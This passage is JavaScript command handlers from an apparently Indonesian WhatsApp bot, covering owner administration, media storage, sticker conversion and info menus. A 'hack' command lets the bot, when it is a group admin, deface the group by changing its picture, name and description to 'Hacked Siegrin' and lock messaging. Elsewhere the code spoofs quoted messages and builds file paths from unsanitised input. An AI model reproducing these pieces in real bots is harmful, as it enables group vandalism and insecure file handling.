case 'setthumb':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return reply(ind.baned())
if (!isOwner) return replysticker(ownerstc)
if (!isQuotedImage) return reply('Reply Imagenya')
svst = body.slice(9)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
fs.writeFileSync(`./src/siegrin.jpeg`, delb)
replysticker(successtc)
break
case 'setmemlimit':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return reply(ind.baned())
if (args.length < 1) return
if (!isOwner) return replysticker(ownerstc)
if (isNaN(args[0])) return reply('limit harus angka')
memberlimit = args[0]
reply(`Change Member limit To ${memberlimit} SUCCESS!`)
break	
case 'giftlimit':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return reply(ind.baned())
if (!isOwner) return replysticker(ownerstc)
if (!q.includes('.')) return  reply(`cara menggunakan fitur ini $prefix+command} @tagtarget.nominal`)
const tujuanlimit = q.substring(0, q.indexOf('|') - 1)
const jumblahlimit = q.substring(q.lastIndexOf('|') + 1)
const jumblah2limit = jumblahlimit * 1
if(isNaN(jumblahlimit)) return await reply('jumlah harus berupa angka!!')
const tujuanlimittf = `${tujuanlimit.replace("@", '')}@s.whatsapp.net`
addLimitUser(tujuanlimittf, jumblah2limit)
client.sendMessage(from, `*「 SUKSES 」*\n*Gift Limit  Sukses*\n*FROM:@${player.split("@")[0]}*\n*TO:@${tujuanlimit.replace("@", '')}*\n*TOTAL:${jumblah2limit}*`, text, {quoted:mek, contextInfo: {forwardingScore : 508, isForwarded: true, mentionedJid: [player, tujuanlimittf]}})
break
case 'giftmoney':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return reply(ind.baned())
if (!isOwner) return replysticker(ownerstc)
if (!q.includes('|')) return  reply(`cara menggunakan fitur ini $prefix+command} @tagtarget.nominal`)
const tujuanmoney = q.substring(0, q.indexOf('|') - 1)
const jumblahmoney = q.substring(q.lastIndexOf('|') + 1)
const jumblah2money = jumblahmoney * 1
if(isNaN(jumblahmoney)) return await reply('jumlah harus berupa angka!!')
const tujuanmoneytf = `${tujuanmoney.replace("@", '')}@s.whatsapp.net`
addKoinUser(tujuanmoneytf, jumblah2money)
client.sendMessage(from, `*「 SUKSES 」*\n*Gift Money Sukses*\n*FROM:@${player.split("@")[0]}*\n*TO:@${tujuanmoney.replace("@", '')}*\n*TOTAL:${jumblah2money}*`, text, {quoted:mek, contextInfo: {forwardingScore : 508, isForwarded: true, mentionedJid: [player, tujuanmoneytf]}})
break
//********** ADD SISTEM **********
case 'addcmd': 
case 'setcmd':
case 'cmd':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (isQuotedSticker) {
if (!q) return reply(`Kirim/Reply sticker dengan caption ${prefix+command} command yang ingin di tambahkan`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
replysticker(successtc)
} else {
reply(`Kirim/Reply sticker dengan caption ${prefix+command} command yang ingin di tambahkan`)
}
break
case 'delcmd':
case 'uncmd':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc) 
if (!isQuotedSticker) return reply(`Example : ${command} tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
 scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(scommand))
replysticker(successtc)
break
case 'addpremium':
case 'premium':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (args.length < 1) return reply(`Example:${prefix}${command} nomor atau tag`)
const addpremiumbotaa = `${args[0].replace("@", '')}@s.whatsapp.net`
prem.push(`${args[0].replace("@", '')}@s.whatsapp.net`)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(prem))
replysticker(successtc)
break
case 'addpremium':
case 'premium':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (args.length < 1) return reply(`Example:${prefix}${command} nomor atau tag`)
const addpremiumbot = `${args[0].replace("@", '')}@s.whatsapp.net`
prem.push(`${args[0].replace("@", '')}@s.whatsapp.net`)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(prem))
replysticker(successtc)
break
case 'delpremium':
case 'unpremium':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (args.length < 1) return reply(`Example:${prefix}${command} nomor atau tag`)
const delpremiumbot = `${args[0].replace("@", '')}@s.whatsapp.net`
var arr = prem
for( var dp = 0; dp < arr.length; dp++){ 
if ( arr[dp] === delpremiumbot) { 
arr.splice(dp, 1); 
dp--; 
fs.writeFileSync('./database/user/premium.json',JSON.stringify(arr))}}
replysticker(successtc)
break
case 'addblock':
case 'block':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc) 
if (args.length < 1) return reply(`Example:${prefix}${command} nomor atau tag`)
client.updatePresence(from, Presence.composing) 
const blockbot = `${args[0].replace("@", '')}@s.whatsapp.net`
client.blockUser(`${args[0].replace("@", '')}@c.us`, "add")
blocked.push(`${args[0].replace("@", '')}@s.whatsapp.net`)
replysticker(successtc)
break
case 'delblock':
case 'unblock':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc) 
if (args.length < 1) return reply(`Example:${prefix}${command} nomor atau tag`)
 client.updatePresence(from, Presence.composing) 
const unblockbot = `${args[0].replace("@", '')}@s.whatsapp.net`
var arr = blocked
for( var dp = 0; dp < arr.length; dp++){ 
if ( arr[dp] === unblockbot) { 
arr.splice(dp, 1); 
dp--;}}
client.blockUser(`${args[0].replace("@", '')}@c.us`, "remove")
replysticker(successtc)
break
case 'addbadword': 
case 'badword':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (args.length < 1) return reply( `Ketik ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword tolol`)
const bw =  args.join(" ")
bad.push(bw)
fs.writeFileSync('./database/group/bad.json', JSON.stringify(bad))
replysticker(successtc)
break
 case 'delbadword':
 case 'ubadword':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
 if (args.length < 1) return reply( `Ketik ${prefix}addbadword [kata kasar]. contoh ${prefix+command} tolol`)
 const bwd =  args.join(" ") 
 var arr = bad
for( var dp = 0; dp < arr.length; dp++){ 
if ( arr[dp] === bwd) { 
arr.splice(dp, 1); 
dp--; 
fs.writeFileSync('./database/group/bad.json',JSON.stringify(arr))}}
replysticker(successtc)
break
//**********SISTEM STORAGE **********
case 'addsticker':
case 'addstick':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedSticker) return reply(`Kirim teks dengan caption ${prefix+command} sticker yang ingin ditambahkan ke database`)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} sticker yang ingin ditambahkan ke database`)
wanu = setiker.indexOf(q)
if (!wanu) return reply(`sticker sudah ada didatabase silahkan cek dengan cara ${prefix}liststicker`)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
setiker.push(`${q}`)
fs.writeFileSync(`./strg/sticker/${q}.webp`, delb)
fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
replysticker(successtc)
break
case 'addvn': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedAudio) return reply(`Kirim teks dengan caption ${prefix+command} audio yang ingin ditambahkan ke database`)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} audio yang ingin ditambahkan ke database`)
wanu = audionye.indexOf(q)
if (!wanu) return reply(`audio sudah ada didatabase silahkan cek dengan cara ${prefix}listvn`)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
audionye.push(`${q}`)
fs.writeFileSync(`./strg/audio/${q}.mp3`, delb)
fs.writeFileSync('./strg/audio.json', JSON.stringify(audionye))
replysticker(successtc)
break
case 'addimg':
case 'addimage':  // Fix Bug By Luc
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedImage) return reply(`Kirim teks dengan caption ${prefix+command} image yang ingin ditambahkan ke database`)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} image yang ingin ditambahkan ke database`)
wanu = imagenye.indexOf(q)
if (!wanu) return reply(`image sudah ada didatabase silahkan cek dengan cara ${prefix}listimg`)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
imagenye.push(`${q}`)
fs.writeFileSync(`./strg/image/${q}.jpeg`, delb)
fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
replysticker(successtc)
break
case 'addvideo':  // Fix Bug By Luc
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedVideo) return reply(`Kirim teks dengan caption ${prefix+command} video yang ingin ditambahkan ke database`)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} video yang ingin ditambahkan ke database`)
wanu = videonye.indexOf(q)
if (!wanu) return reply(`video sudah ada didatabase silahkan cek dengan cara ${prefix}listimg`)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
videonye.push(`${q}`)
fs.writeFileSync(`./strg/video/${q}.mp4`, delb)
fs.writeFileSync('./strg/video.json', JSON.stringify(videonye))
replysticker(successtc)
break
				case 'delsticker':
				case 'delstick': 
				case 'delstiker': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} sticker yang ingin dihapus dari database`)
					wanu = setiker.indexOf(q)
					 if (wanu) return reply(`sticker tidak ada didatabase silahkan cek dengan cara ${prefix}liststicker`)
					 setiker.splice(q, 1)
					 fs.unlinkSync(`./strg/sticker/${q}.webp`)
					 replysticker(successtc)
					break
					case 'delvn':
					if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} audio yang ingin dihapus dari database`)
					wanu = audionye.indexOf(q)
					 if (wanu) return reply(`audio tidak ada didatabase silahkan cek dengan cara ${prefix}listvideo`)
					 audionye.splice(q, 1)
					 fs.unlinkSync(`./strg/audio/${q}.mp3`)
					 replysticker(successtc)
					break
				case 'delimage':
				case 'delimg':
				if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} image yang ingin dihapus dari database`)
					 wanu = imagenye.indexOf(q)
					 if (wanu) return reply(`Image tidak ada didatabase silahkan cek dengan cara ${prefix}listimg`)
					 imagenye.splice(q, 1)
					 fs.unlinkSync(`./strg/image/${q}.jpeg`)
					 replysticker(successtc)
					break
					case 'delvideo':
				if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} video yang ingin dihapus dari database`)
					wanu = videonye.indexOf(q)
					 if (wanu) return reply(`video tidak ada didatabase silahkan cek dengan cara ${prefix}listvideo`)
					 videonye.splice(q, 1)
					 fs.unlinkSync(`./strg/video/${q}.mp4`)
					 replysticker(successtc)
					break
case 'chsticker':  
case 'chstick':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedImage) return reply(`Kirim teks dengan caption ${prefix+command} sticker yang ingin diganti dari database`)
wanu = setiker.indexOf(q)
if (wanu) return reply(`sticker tidak ada didatabase silahkan cek dengan cara ${prefix}liststicker`)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
fs.writeFileSync(`./strg/sticker/${q}.webp`, delb)
replysticker(successtc)
break
case 'chimage':  
case 'chimg':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedImage) return reply(`Kirim teks dengan caption ${prefix+command} image yang ingin diganti dari database`)
wanu = imagenye.indexOf(q)
if (wanu) return reply(`image tidak ada didatabase silahkan cek dengan cara ${prefix}listimg`)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
fs.writeFileSync(`./strg/image/${q}.jpeg`, delb)
replysticker(successtc)
break
case 'chvn':  
case 'chaudio':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedImage) return reply(`Kirim teks dengan caption ${prefix+command} audio yang ingin diganti dari database`)
wanu = audionye.indexOf(q)
if (wanu) return reply(`audio tidak ada didatabase silahkan cek dengan cara ${prefix}listvn`)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
fs.writeFileSync(`./strg/audio/${q}.mp3`, delb)
replysticker(successtc)
break
case 'chvideo':  
case 'chvid':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedImage) return reply(`Kirim teks dengan caption ${prefix+command} video yang ingin diganti dari database`)
wanu = videonye.indexOf(q)
if (wanu) return reply(`video tidak ada didatabase silahkan cek dengan cara ${prefix}listvideo`)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
fs.writeFileSync(`./strg/video/${q}.mp4`, delb)
replysticker(successtc)
break
//********** SETTING SISTEM **********		
case 'readall':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
 var chats = await client.chats.all()
chats.map( async ({ jid }) => {
await client.chatRead(jid)
})
replysticker(successtc)
 console.log(chats.length)
break
case 'mute':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.modifyChat(from, ChatModification.mute, 24*60*60*1000)
replysticker(successtc)
console.log('succes mute chat = ' + from)
break
 case 'unmute':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.modifyChat(from, ChatModification.unmute)
replysticker(successtc)
console.log('succes unmute chat = ' + from)
break
case 'unpin':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.modifyChat(from, ChatModification.unpin)
replysticker(successtc)
console.log('unpin chat = ' + from)
break	   	
 case 'pin':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.modifyChat(from, ChatModification.pin)
replysticker(successtc)
console.log('pinned chat = ' + from)
break
 case 'unreadall':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
var chats = await client.chats.all()
chats.map( async ({ jid }) => {
await client.chatRead(jid, 'unread')
})
replysticker(successtc)
console.log(chats.length)
break
case 'unarchive':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
replysticker(successtc)
console.log('succes unarchive chat = ' + from)
anu = await client.chats.all()
for (let _ of anu) {
client.modifyChat(_.jid, ChatModification.unarchive)
}
break
case 'archive':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
replysticker(successtc)
console.log('succes archive chat = ' + from)
await sleep(3000)
client.modifyChat(from, ChatModification.archive)
break
case 'delpc':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
replysticker(successtc)
console.log('succes delete chat = ' + from)
await sleep(4000)
client.modifyChat(from, ChatModification.delete)
break	
case 'clearall':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
anu = await client.chats.all()
client.setMaxListeners(20)
for (let _ of anu) {
client.modifyChat(_.jid, ChatModification.delete)
}
replysticker(successtc)
break
case 'listcmd':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
let teksnyee = `*LIST STICKER CMD*`
let cemde1 = [];
for (let i of scommand) {
cemde1.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd :* ${i.chats}`
}
sendButtonImageLoc(from, buttonshello, teksnyee, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'listrespon':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
let teksnyeee = `*LIST RESPON CMD*`
let rcemde1 = [];
for (let i of commandsrespon) {
rcemde1.push(i.pesan)
teksnyeee += `\n\n*•> ID :* ${i.pesan}\n*•> Cmd :* ${i.balasan}`
}
sendButtonImageLoc(from, buttonshello, teksnyeee, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break

				   case 'viewonce':

if (!isRegistered) return sendButtonNotRegis(from)
res = await client.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": "",
"viewOnce": true
}
}
}
}, {}) 
client.relayWAMessage(res)
break
case 'restart':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
						reply('Okey')
				return client.sendMessage(from, JSON.stringify(eval(process.exit())))
				
				break
                    case 'exif':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done gan')
		break
case 'hack':

if (!isOwner) return
if (!isBotGroupAdmins) return
if (!isGroup) return
anu = fs.readFileSync('strg/image/gaklah.jpeg')
client.updateProfilePicture(from, anu)
client.groupUpdateSubject(from, `Hacked Siegrin`)
client.groupUpdateDescription(from, `Mampos Gw Kudet`)
client.groupSettingChange(from, GroupSettingChange.messageSend, true)
setTimeout(() => {
reply('Mwuehehe kena hack kacian')
}, 8000)
break
	
case 'stickergif':
case 'sgif':
case 'stiker': 
case 'sticker':
case 'sk':
case 's':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
replysticker(errorstc)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 10 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 10) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
replysticker(errorstc)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
  } else if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
replysticker(errorstc)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker atau reply/tag gambar(durasi sticker video 1-9 detik)`)
}
await confirmLIMIT(sender, [angka])
break

//********** INFO MENU **********
case 'contributor':
case 'support':
case 'developer':
case 'team':
case 'author':
case 'dev':
if (!isRegistered) return sendButtonNotRegis(from)  
if (isBanned) return replysticker(banstc) 
client.sendMessage(from, {
"displayName": "2 kontak",
"contacts": contri1 
}, 'contactsArrayMessage', { quoted: mek})
break
case 'owner':
case 'creator':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
client.sendMessage(from, {
"displayName": "5 Contact",
"contacts": contrii 
}, 'contactsArrayMessage', { quoted: mek})
break
case 'youtube':
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, `${myyoutube}`, support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'twitter':
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, `${mytwitter}`, support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'tiktok':
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, `${mytiktok}`, support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'sc':
case 'sc':
case 'scbot':
case 'source':
case 'sourcecode':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, `Source Code Bot : ${github}`, support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case'runtime':
case'run':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
run = process.uptime() 
sendButtonImageLoc(from, `${kyun(run)}`, support, buttonsmenu2, { quoted: fdoc,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break 
case 'bahasa':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, ind.bahasa(), support, buttonsmenu2, { quoted: fdoc,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break 
case 'donasi':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from,  buttonshello, ind.donasi(prefix, player, ow, trakteer, saweria, donasi, rekening), buttonsmenu2, { quoted: fdoc,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'rules':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, ind.rules(player, hahh, dev, numbernye), support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
break
case 'gcbot':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, buttonshello, ind.gcofficial(player, hahh, dev, numbernye), buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
break 
case'speed':
case'ping':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
const timestamp = speed();
const latensi = speed() - timestamp
exec(`neofetch --stdout`, (error, stdout, stderr) => {
const child = stdout.toString('utf-8')
const teks = child.replace(/Memory:/, "Ram:")
const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
sendButtonImageLoc(from, pingnya, support, buttonsmenu2, { quoted: fdoc,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
})
break  
case 'wa.me':
case 'wame':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return reply(ind.baned())
client.updatePresence(from, Presence.composing) 
sendButtonImageLoc(from, `*Link WhatsApp-Mu :* *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`, support, buttonsmenu2, { quoted: fdoc,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break		
case 'request':
case 'laporan':
case 'bugreport':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} request yang di ingin`)
var nomor = mek.participant
const ress = `*Nomor :@${player.split("@")[0]}*\nPesan : ${q}`
var options = {
text: ress,
contextInfo: {mentionedJid: [nomor]},
}
client.sendMessage(ow, options, text, {quoted: {key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289530298948-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 999,status: 200, thumbnail: buffer, surface: 200, message: `LAPORAN BWANG`, orderTitle: 'L', sellerJid: '0@s.whatsapp.net'}}}, contextInfo :{sendEphemeral: true, mentionedJid: [player, dev]}})
reply(`*REQUEST ANDA TELAH SAMPAI KE OWNER*`)
break
case 'profile':
case 'profil':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing)
				try {
				ppnu = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
ppnu = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buffer = await getBuffer(ppnu)

const profilec = await client.prepareMessage(from, buffer, MessageType.location, {thumbnail: buffer})

let ppmu = profilec.message["ephemeralMessage"] ? profilec.message.ephemeralMessage : profilec
{
const buttons= [
  {buttonId: `inventory`, buttonText: {displayText: 'INVENTORY'}, type: 1},
]
const buttonMessage = {
    contentText: `╭─「 *PROFILE ANDA* 」\n│• *Name:* ${pushname}\n│• *XP:* ${getLevelingXp(sender)}\n│• *Level:* ${getLevelingLevel(sender)}\n│• *User Terdaftar:* ✓\n│• *Link:* wa.me/${sender.split("@")[0]}\n╰──────────────────`,
	footerText:support,
    buttons: buttons,
    headerType: 6, 
	locationMessage: ppmu.message.locationMessage
}
client.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [sender, numbernye, dev, ow]}})
}
break
case 'blocklist': 
case 'listblock': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
client.updatePresence(from, Presence.composing) 
teks = '*BLOCKLIST:*\n'
for (let block of blocked) {
teks += `├❏@${block.split('@')[0]}\n`
}
teks += `└❏ *Total:* ${blocked.length}`
